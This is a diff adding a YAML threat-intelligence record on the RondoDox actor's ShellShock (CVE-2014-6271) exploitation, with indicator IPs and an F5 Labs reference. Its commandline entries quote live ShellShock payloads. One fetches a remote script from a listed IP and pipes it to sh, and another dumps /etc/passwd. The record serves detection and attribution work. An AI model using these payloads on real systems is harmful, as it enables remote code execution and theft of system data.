@@ -1,0 +1,45 @@
+description: RondoDox threat actor exploited CVE-2014-6271 (ShellShock) and other
+  vulnerabilities to deliver payloads and execute arbitrary commands.
+attribution: RondoDox
+TTPs:
+  processes:
+  - bash
+  commandline:
+  - '() { :; }; /bin/bash -c \"(wget -qO- http://74.194.191.52/rondo.ame.sh ||busybox
+    wget -qO- http://74.194.191.52/rondo.ame.sh ||curl -s http://74.194.191.52/rondo.ame.sh)
+    | sh\" & # rondo2012@atomicmail.io'
+  - '() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd'
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - bash->http://74.194.191.52/rondo.ame.sh
+  - bash->http://74.###.###.52/rondo.ame.sh
+  file_activity:
+  - /etc/passwd
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 192.159.99.95
+  - 124.198.131.83
+  - 169.150.203.62
+  - 193.26.115.195
+  - 45.88.186.85
+  - 45.88.186.32
+  - 45.153.34.156
+  - 45.156.87.165
+  - 46.190.1.53
+  - 45.61.149.191
+  - 74.194.191.52
+  - 169.150.203.62
+  domains: []
+  urls:
+  - http://74.###.###.52/rondo.ame.sh
+authors:
+- Adam Metcalfe-Pearce
+reference: https://www.f5.com/labs/articles/shellshock-makes-a-comeback-and-rondodox-changes-tactics
+date_of_publication: November 06, 2025
+file_creation_date: December 09, 2025
